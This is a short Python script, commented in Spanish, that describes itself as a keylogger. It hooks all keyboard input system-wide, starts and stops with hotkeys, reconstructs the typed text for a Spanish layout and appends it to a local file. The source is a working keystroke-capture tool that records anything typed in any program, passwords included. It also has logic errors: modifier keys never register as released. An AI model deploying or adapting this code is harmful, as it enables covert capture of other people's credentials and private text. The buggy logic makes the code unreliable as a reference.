import keyboard

# Ruta del archivo para registrar las entradas
RUTA_ARCHIVO = "C:/Users/rodri/OneDrive/Desktop/Carpeta/documentos/duplicado.txt"
teclado_activo = False  # Control de estado del keylogger
registro_actual = ""  # Texto dinámico en memoria
texto = ""

# Mapeos para teclas modificadoras
shift_map={
    '1': '!', '2': '"', '3': '·', '4': '$', '5': '%', '6': '&', '7': '/', '8': '(', '9': ')', '0': '=',
    "'": '?', '¡': '¿', '-': '_', '.': ':', ',': ';', '´': '¨', '`': '^', '+': '*','<': '>', 'º': 'ª'
}

Altgr_map={
    '1': '|', '2': '@', '3': '#', '4': '~', '5': '€', '6': '¬', '´': '{', '`': '[', '+': ']', 'ç': '}',
    'º': "\ "
}

shift_presionado = False
altgr_presionado = False

def registrar_tecla(event):
    """
    Función para registrar una tecla presionada en el registro temporal y el archivo.
    """
    global teclado_activo, registro_actual, texto, shift_presionado, altgr_presionado

    if not teclado_activo:  # Evita registrar si está desactivado
        return

    if event.event_type == "down":
        tecla = event.name
        if texto == "q":
            texto = ""
        # Detectar si Shift o AltGr están presionados
        if tecla == "mayusculas":
            shift_presionado = True
            return
        elif tecla == "alt gr":
            altgr_presionado = True
            return

        # Detectar si Shift o AltGr se han soltado
        if tecla == "mayusculas" and event.event_type == "up":
            shift_presionado = False
            return
        elif tecla == "alt gr" and event.event_type == "up":
            altgr_presionado = False
            return

        # Mapeos para caracteres especiales
        if tecla == "space":
            registro_actual = " "
        elif tecla == "enter":
            registro_actual = "\n"
        elif tecla == "tab":
            registro_actual = "\t"
        elif tecla == "backspace":
            if len(texto) > 0:
                texto = texto[:-1]
                print(f"Texto actual: {texto}")
            return
        elif tecla == "ctrl" or tecla == "alt":
            return
        elif shift_presionado and tecla in shift_map:
            registro_actual = shift_map[tecla]
        elif altgr_presionado and tecla in Altgr_map:
            registro_actual = Altgr_map[tecla]
        elif tecla.isalpha() or tecla.isdigit() or tecla in ["-", ".", ",","´", "`", "+", "ç", "<", "º", "¡", "ñ", "'"]:
            registro_actual = tecla
        else:
            registro_actual = ""

        texto += registro_actual
        print(f"Texto actual: {texto}")

def iniciar_registro():
    """
    Activa el registro de teclas.
    """
    global teclado_activo
    if not teclado_activo:
        print("=== Registro de teclado activado ===")
        teclado_activo = True
    else:
        print("El registro de teclado ya está activo.")

def detener_registro():
    """
    Desactiva el registro de teclas.
    """
    global teclado_activo
    if teclado_activo:
        print("=== Registro de teclado detenido ===")
        teclado_activo = False
    else:
        print("El registro de teclado no está activo.")

# Atajos para iniciar y detener el registro
keyboard.add_hotkey("ctrl+alt+q", iniciar_registro)  # Inicia con Ctrl+Alt+Q
keyboard.add_hotkey("ctrl+alt+w", detener_registro)  # Detiene con Ctrl+Alt+W

# Registrar todas las teclas presionadas
keyboard.on_press(registrar_tecla)

# Mensaje inicial
print("Presiona Ctrl+Alt+Q para iniciar el registro de teclas.")
print("Presiona Ctrl+Alt+W para detener el registro de teclas.")
print("Presiona Ctrl+C para salir del programa.")

# Mantén el programa en ejecución
try:
    keyboard.wait("ctrl+c")  # Espera indefinidamente hasta que se pulse Ctrl+C
    print(f"Todo el texto registrado: {texto}")
    with open(RUTA_ARCHIVO, "a", encoding="utf-8") as archivo:
        archivo.write(texto[:-1])
except KeyboardInterrupt:
    print("Programa terminado.")